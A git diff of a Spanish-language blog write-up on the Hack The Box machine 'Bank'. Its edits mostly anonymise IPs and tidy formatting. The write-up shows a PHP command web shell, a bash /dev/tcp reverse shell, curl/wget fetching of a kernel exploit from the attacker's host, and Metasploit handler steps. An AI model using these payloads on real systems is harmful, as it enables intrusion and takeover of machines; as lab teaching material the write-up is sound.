@@ -1,7 +1,7 @@
 ---
 layout: single
 title: Bank - Hack The Box
-excerpt: "Esta máquina fue algo difícil porque no pude escalar privilegios usando un Exploit sino que se usa un binario que automáticamente te convierte en Root, además de que tuve que investigar bastante sobre operaciones REGEX (como las odio) para poder filtrar texto. Aunque se ven temas interesantes como el ataque de transferencia de zona DNS y veremos acerca del virtual hosting que por lo que he investigado, hay otras máquinas que lo van a ocupar."
+excerpt: "Esta máquina fue algo difícil porque no pude escalar privilegios usando un Exploit sino que se usa un binario que automáticamente te convierte en Root, además de que tuve que investigar bastante sobre operaciones REGEX para poder filtrar texto. Aunque se ven temas interesantes como el ataque de transferencia de zona DNS y veremos acerca del virtual hosting que por lo que he investigado, hay otras máquinas que lo van a ocupar."
 date: 2023-02-19
 classes: wide
 header:
@@ -18,10 +18,10 @@ tags:
   - Virtual Hosting
   - Fuzzing
   - Information Leakage
-  - Remote Command Execution - (RCE)
+  - Remote Command Execution (RCE)
   - Reverse Shell
-  - Local Privilege Escalation - (LPE)
-  - LPE - SUID Binary
+  - Local Privilege Escalation (LPE)
+  - Privesc - Abusing SUID Binary (LPE)
   - OSCP Style
   - Metasploit Framework
 ---
@@ -30,9 +30,9 @@ tags:
 Esta máquina fue algo difícil porque no pude escalar privilegios usando un Exploit sino que se usa un binario que automáticamente te convierte en Root, además de que tuve que investigar bastante sobre operaciones REGEX (como las odio) para poder filtrar texto. Aunque se ven temas interesantes como el **ataque de transferencia de zona DNS** y veremos acerca del **virtual hosting** que por lo que he investigado, hay otras máquina que lo van a ocupar.
 
 Herramientas utilizadas:
+* *ping*
 * *nmap*
 * *wappalizer*
-* *ping*
 * *dig*
 * *wfuzz*
 * *gobuster*
@@ -40,10 +40,18 @@ Herramientas utilizadas:
 * *cat*
 * *grep*
 * *nc*
+* *git*
 * *PHP*
 * *msfvenom*
-* *msfconsole*
+* *metasploit framework(msfconsole)*
+* *Módulo: exploit/multi/handler*
+* *Módulo: post/multi/recon/local_exploit_suggester*
+* *meterpreter*
 * *python*
+* *id*
+* *uname*
+* *searchsploit*
+* *find*
 
 
 <br>
@@ -88,10 +96,7 @@ Herramientas utilizadas:
 <br>
 <hr>
 <div style="position: relative;">
- <h1 id="Recopilacion" style="text-align:center;">Recopilación de Información</h1>
-  <button style="position:absolute; left:80%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
-   <a href="#Indice">Volver al Índice</a>
-  </button>
+	<h1 id="Recopilacion" style="text-align:center;">Recopilación de Información</h1>
 </div>
 <br>
 
@@ -201,10 +206,7 @@ Pues nos manda la página por defecto de **Apache** y no nos muestra nada en rea
 <br>
 <hr>
 <div style="position: relative;">
- <h1 id="Analisis" style="text-align:center;">Análisis de Vulnerabilidades</h1>
-  <button style="position:absolute; left:80%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
-   <a href="#Indice">Volver al Índice</a>
-  </button>
+	<h1 id="Analisis" style="text-align:center;">Análisis de Vulnerabilidades</h1>
 </div>
 <br>
 
@@ -295,8 +297,7 @@ Tenemos bastante información que nos puede ser útil más adelante. Ahora vamos
 <br>
 
 Aqui el link con más información:
-
-* https://www.hostinger.mx/tutoriales/comando-dig-linux
+* <a href="https://www.hostinger.mx/tutoriales/comando-dig-linux" target="_blank">Cómo usar el comando Dig en Linux</a>
 
 Entonces, utilicemos esta herramienta, hagamos varias pruebas:
 
@@ -366,20 +367,7 @@ Total requests: 220560
 ID           Response   Lines    Word       Chars       Payload                                                                     
 =====================================================================
 
-000000001:   302        188 L    319 W      7322 Ch     "# directory-list-2.3-medium.txt"                                           
-000000002:   302        188 L    319 W      7322 Ch     "#"                                                                         
-000000011:   302        188 L    319 W      7322 Ch     "# Priority ordered case sensative list, where entries were found"          
-000000010:   302        188 L    319 W      7322 Ch     "#"                                                                         
-000000008:   302        188 L    319 W      7322 Ch     "# or send a letter to Creative Commons, 171 Second Street,"                
-000000007:   302        188 L    319 W      7322 Ch     "# license, visit http://creativecommons.org/licenses/by-sa/3.0/"           
-000000004:   302        188 L    319 W      7322 Ch     "#"                                                                         
-000000009:   302        188 L    319 W      7322 Ch     "# Suite 300, San Francisco, California, 94105, USA."                       
-000000003:   302        188 L    319 W      7322 Ch     "# Copyright 2007 James Fisher"                                             
-000000012:   302        188 L    319 W      7322 Ch     "# on atleast 2 different hosts"                                            
 000000014:   302        188 L    319 W      7322 Ch     "http://bank.htb//"                                                         
-000000006:   302        188 L    319 W      7322 Ch     "# Attribution-Share Alike 3.0 License. To view a copy of this"             
-000000005:   302        188 L    319 W      7322 Ch     "# This work is licensed under the Creative Commons"                        
-000000013:   302        188 L    319 W      7322 Ch     "#"                                                                         
 000000083:   403        10 L     30 W       281 Ch      "icons"                                                                     
 000000291:   200        20 L     104 W      1696 Ch     "assets"                                                                    
 000000164:   403        10 L     30 W       283 Ch      "uploads"                                                                   
@@ -419,7 +407,7 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 [+] User Agent:              gobuster/3.5
 [+] Timeout:                 10s
 ===============================================================
-2024/04/18 14:29:50 Starting gobuster in directory enumeration mode
+Starting gobuster in directory enumeration mode
 ===============================================================
 /uploads              (Status: 301) [Size: 305] [--> http://bank.htb/uploads/]
 /assets               (Status: 301) [Size: 304] [--> http://bank.htb/assets/]
@@ -437,7 +425,6 @@ Progress: 220530 / 220561 (99.99%)
 | *-t*       | Para indicar la cantidad de hilos a usar. |
 
 <br>
-
 
 Bien, vemos algunos subdominios que podemos investigar, ahora el ataque.
 
@@ -497,10 +484,12 @@ Para descargar el texto vamos a usar **curl** y expresiones **REGEX** para filtr
 ```bash
 curl -s -X GET "http://bank.htb/balance-transfer/"
 ```
+
 Si lo dejamos así, solo veremos el código HTML por lo que usaremos la herramienta **html2text** para cambiar de HTML a texto:
 ```bash
 curl -s -X GET "http://bank.htb/balance-transfer/" | html2text
 ```
+
 Ahora si se ve en texto, pero no quiero que se vean esos corchetes además de que nos molestaran a la hora del filtrado, así que vamos a eliminarlos con **awk**:
 ```
 curl -s -X GET "http://bank.htb/balance-transfer/" | html2text | awk '{print $3 " " $5}' > output.txt
@@ -567,17 +556,14 @@ Veo que podemos subir archivos, pero no dice de que tipo. Quizá si analizamos e
 ¡Ahí está! Solamente acepta archivos con terminación **.htb** y dichos archivos deben ser hechos en **PHP**, lo que podemos hacer es cargar un Payload para poder conectarnos de manera remota. Busquemos uno en internet:
 
 Aqui un Payload:
-* https://github.com/pentestmonkey/php-reverse-shell
+* <a href="https://github.com/pentestmonkey/php-reverse-shell" target="_blank">Repositorio de pentestmonkey: php-reverse-shell</a>
 
 
 <br>
 <br>
 <hr>
 <div style="position: relative;">
- <h1 id="Explotacion" style="text-align:center;">Explotación de Vulnerabilidades</h1>
-  <button style="position:absolute; left:80%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
-   <a href="#Indice">Volver al Índice</a>
-  </button>
+	<h1 id="Explotacion" style="text-align:center;">Explotación de Vulnerabilidades</h1>
 </div>
 <br>
 
@@ -617,7 +603,7 @@ mv php-reverse-shell.php LocalRS.htb
 <img src="/assets/images/htb-writeup-bank/Captura10.png">
 </p>
 
-* Levantamos una netcat con el puerto que pusimos en el Payload:
+* Levantamos una **netcat** con el puerto que pusimos en el Payload:
 ```bash
 nc -nvlp 443                          
 listening on [any] 443 ...
@@ -633,7 +619,7 @@ listening on [any] 443 ...
 ```bash
 nc -nvlp 443                          
 listening on [any] 443 ...
-connect to [10.10.14.14] from (UNKNOWN) [10.10.10.29] 56838
+connect to [Tu_IP] from (UNKNOWN) [10.10.10.29] 56838
 Linux bank 4.4.0-79-generic #100~14.04.1-Ubuntu SMP Fri May 19 18:37:52 UTC 2017 i686 athlon i686 GNU/Linux
  01:46:21 up 38 min,  0 users,  load average: 0.00, 0.00, 0.00
 USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
@@ -646,12 +632,12 @@ Ya solo es cosa de buscar la flag del usuario que esta en el directorio **/home*
 
 <h2 id="cmd">Ganando Acceso con Archivo CMD de PHP</h2>
 
-Como ya vimos que si acepto nuestro archivo malicioso, vamos a probar a cargar un archivo que contenga una CMD en PHP, para que podamos ejecutar comandos desde la Web y poder ganar acceso desde ahí.
+Como ya vimos que si acepto nuestro archivo malicioso, vamos a probar a cargar un archivo que contenga una **CMD** en **PHP**, para que podamos ejecutar comandos desde la Web y poder ganar acceso desde ahí.
 
 Hagamoslo por pasos:
 
 * Crea el siguiente script en **PHP**:
-```bash
+```php
 <?php
 	system($_REQUEST['cmd']);
 ?>
@@ -678,18 +664,18 @@ listening on [any] 1234 ...
 * Ejecuta el siguiente comando en la URL, **cambiamos los ampersant (&) por %26** para que funcione correctamente:
 ```bash
 Original:
-?cmd=bash -c 'bash -i >& /dev/tcp/10.10.14.77/1234 0&>1'
+?cmd=bash -c 'bash -i >& /dev/tcp/Tu_IP/1234 0&>1'
 .
 .
 Modificado para web:
-?cmd=bash -c 'bash -i >%26 /dev/tcp/10.10.14.77/1234 0>%261'
+?cmd=bash -c 'bash -i >%26 /dev/tcp/Tu_IP/1234 0>%261'
 ```
 
-* Observa la netcat:
+* Observa la **netcat**:
 ```bash
 nc -nvlp 1234
 listening on [any] 1234 ...
-connect to [10.10.14.77] from (UNKNOWN) [10.10.10.29] 44272
+connect to [Tu_IP] from (UNKNOWN) [10.10.10.29] 44272
 bash: cannot set terminal process group (1069): Inappropriate ioctl for device
 bash: no job control in this shell
 www-data@bank:/var/www/bank/uploads$ whoami
@@ -724,8 +710,6 @@ Payload size: 34850 bytes
 ```bash
 msfconsole
 .
-.
-.
 msf6 > use multi/handler
 [*] Using configured payload generic/shell_reverse_tcp
 msf6 exploit(multi/handler) >
@@ -754,10 +738,7 @@ Y listo, con esto hemos ganado acceso a la máquina con **Metasploit Framework**
 <br>
 <hr>
 <div style="position: relative;">
- <h1 id="Post" style="text-align:center;">Post Explotación</h1>
-  <button style="position:absolute; left:80%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
-   <a href="#Indice">Volver al Índice</a>
-  </button>
+	<h1 id="Post" style="text-align:center;">Post Explotación</h1>
 </div>
 <br>
 
@@ -791,9 +772,10 @@ uname -a
 Linux bank 4.4.0-79-generic #100~14.04.1-Ubuntu SMP Fri May 19 18:37:52 UTC 2017 i686 athlon i686 GNU/Linux
 ```
 
-Muy bien, busquemos un Exploit. Buscando un Exploit por internet, encontré este:
+Muy bien, busquemos un Exploit. 
 
-* https://www.exploit-db.com/exploits/44298
+Buscando un Exploit por internet, encontré este:
+* <a href="https://www.exploit-db.com/exploits/44298" target="_blank">Linux Kernel < 4.4.0-116 (Ubuntu 16.04.4) - Local Privilege Escalation</a>
 
 Bien, busquemoslo con **Searchsploit**:
 ```bash
@@ -836,12 +818,6 @@ Linux < 4.16.9 / < 4.14.41 - 4-byte Infoleak via Uninitialized Struct Field in c
 Linux < 4.20.14 - Virtual Address 0 is Mappable via Privileged write() to /proc/*/mem                      | linux/dos/46502.txt
 Linux Kernel (Solaris 10 / < 5.10 138888-01) - Local Privilege Escalation                                  | solaris/local/15962.c
 Linux Kernel 2.4/2.6 (RedHat Linux 9 / Fedora Core 4 < 11 / Whitebox 4 / CentOS 4) - 'sock_sendpage()' Rin | linux/local/9479.c
-Linux Kernel 2.6.19 < 5.9 - 'Netfilter Local Privilege Escalation                                          | linux/local/50135.c
-Linux Kernel 3.11 < 4.8 0 - 'SO_SNDBUFFORCE' / 'SO_RCVBUFFORCE' Local Privilege Escalation                 | linux/local/41995.c
-Linux Kernel 4.10.5 / < 4.14.3 (Ubuntu) - DCCP Socket Use-After-Free                                       | linux/dos/43234.c
-Linux Kernel 4.8.0 UDEV < 232 - Local Privilege Escalation                                                 | linux/local/41886.c
-Linux Kernel < 4.10.13 - 'keyctl_set_reqkey_keyring' Local Denial of Service                               | linux/dos/42136.c
-Linux kernel < 4.10.15 - Race Condition Privilege Escalation                                               | linux/local/43345.c
 ...
 ```
 
@@ -851,14 +827,13 @@ Pero antes, si tienes la sesión activa del **Meterpreter** en **Metasploit**, e
 
 Vamos por pasos:
 
-* Busca el **modulo Suggester** y cargalo:
+* Busca el **módulo Suggester** y cargalo:
 
 ```bash
 msf6 exploit(multi/handler) > search suggester
 .
 Matching Modules
 ================
-.
    #  Name                                      Disclosure Date  Rank    Check  Description
    -  ----                                      ---------------  ----    -----  -----------
    0  post/multi/recon/local_exploit_suggester                   normal  No     Multi Recon Local Exploit Suggester
@@ -891,6 +866,7 @@ searchsploit -m linux/local/47169.c
  Verified: False
 File Type: C source, ASCII text
 ```
+
 Excelente, nos da especificaciones sobre cómo usarlo:
 ```bash
 // Usage:
@@ -903,8 +879,9 @@ Excelente, nos da especificaciones sobre cómo usarlo:
 // user@ubuntu:~$ gcc pwn.c -o pwn
 // user@ubuntu:~$ ./pwn
 ```
+
 Ahora intentemos subirlo, vamos por pasos:
-* Primero vamos a abrir un servidor con Python:
+* Primero vamos a abrir un servidor con **Python**:
 ```bash
 python3 -m http.server                                                            
 Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
@@ -912,8 +889,8 @@ Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 
 * Ahora intentemos subirlo:
 ```bash
-www-data@bank:/$ curl -O http://10.10.14.14:8000/LocalPE.c
-curl -O http://10.10.14.14:8000/LocalPE.c
+www-data@bank:/$ curl -O http://Tu_IP:8000/LocalPE.c
+curl -O http://Tu_IP:8000/LocalPE.c
   % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                  Dload  Upload   Total   Spent    Left  Speed
   0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0Warning: Failed to create the file LocalPE.c: Permission denied
@@ -921,14 +898,14 @@ curl -O http://10.10.14.14:8000/LocalPE.c
 curl: (23) Failed writing body (0 != 2656)
 ```
 
-* Chetos no se puede, intentémoslo de otra forma:
+* No se puede, intentémoslo de otra forma:
 ```bash
-www-data@bank:/$ wget 10.10.14.14/LocalPE.c
-wget 10.10.14.14/LocalPE.c
---2023-04-04 02:11:28--  http://10.10.14.14/LocalPE.c
-Connecting to 10.10.14.14:80... failed: Connection refused.
+www-data@bank:/$ wget Tu_IP/LocalPE.c
+wget Tu_IP/LocalPE.c
+--2023-04-04 02:11:28--  http://Tu_IP/LocalPE.c
+Connecting to Tu_IP:80... failed: Connection refused.
 ```
-Era OBVIO que no teníamos permisos para descargar cosas xd, solamente lo hice para tener un ejemplo de cómo enviar archivos a un SO Linux.
+Era obvio que no teníamos permisos para descargar cualquier cosa, solamente lo hice para tener un ejemplo de cómo enviar archivos a un SO Linux.
 
 <h2 id="Binario">Escalando Privilegios Usando Binario de Máquina</h2>
 
@@ -960,19 +937,22 @@ find \-perm -4000 2>/dev/null
 ./bin/mount
 ./bin/umount
 ```
+
 Tenemos varios como el **passwd, ping** y uno que es extraño:
 ```bash
 www-data@bank:/$ file ./var/htb/bin/emergency
 file ./var/htb/bin/emergency
 ./var/htb/bin/emergency: setuid ELF 32-bit LSB  shared object, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=1fff1896e5f8db5be4db7b7ebab6ee176129b399, stripped
 ```
+
 Ok, veamos que permisos tiene: 
 ```bash
 www-data@bank:/$ ls -la ./var/htb/bin/emergency
 ls -la ./var/htb/bin/emergency
 -rwsr-xr-x 1 root root 112204 Jun 14  2017 ./var/htb/bin/emergency
 ```
-Mmmm ¿Root? Ósea que, si lo ejecutamos, ¿seremos Root? Hagámoslo:
+
+Mmmm ¿**Root**? Ósea que, si lo ejecutamos, ¿seremos **Root**? Hagámoslo:
 ```bash
 www-data@bank:/$ ./var/htb/bin/emergency
 ./var/htb/bin/emergency
@@ -991,10 +971,7 @@ a...Bueno, ya quedaron todas las flags.
 <br>
 <br>
 <div style="position: relative;">
- <h2 id="Links" style="text-align:center;">Links de Investigación</h2>
-  <button style="position:absolute; left:80%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
-   <a href="#Indice">Volver al Índice</a>
-  </button>
+	<h2 id="Links" style="text-align:center;">Links de Investigación</h2>
 </div>
 
 
@@ -1015,3 +992,48 @@ a...Bueno, ya quedaron todas las flags.
 
 <br>
 # FIN
+
+<footer id="myFooter">
+    <!-- Footer para eliminar el botón -->
+</footer>
+
+<style>
+        #backToIndex {
+                display: none;
+                position: fixed;
+                left: 87%;
+                top: 90%;
+                z-index: 2000;
+                background-color: #81fbf9;
+                border-radius: 10px;
+                border: none;
+                padding: 4px 6px;
+                cursor: pointer;
+        }
+</style>
+
+<a id="backToIndex" href="#Indice">
+        <img src="/assets/images/arrow-up.png" style="width: 45px; height: 45px;">
+</a>
+
+<script>
+    window.onscroll = function() { showButton() };
+
+    function showButton() {
+        const scrollPosition = document.documentElement.scrollTop || document.body.scrollTop;
+        const indicePosition = document.getElementById("Indice").offsetTop;
+        const footerPosition = document.getElementById("myFooter").offsetTop;
+        const windowHeight = window.innerHeight;
+
+        const button = document.getElementById("backToIndex");
+
+        // Mostrar el botón si el usuario ha bajado al índice
+        if (scrollPosition >= indicePosition && (scrollPosition + windowHeight) < footerPosition) {
+            button.style.display = "block";
+            button.style.position = "fixed";
+            button.style.top = "90%";
+        } else {
+            button.style.display = "none";
+        }
+    }
+</script>
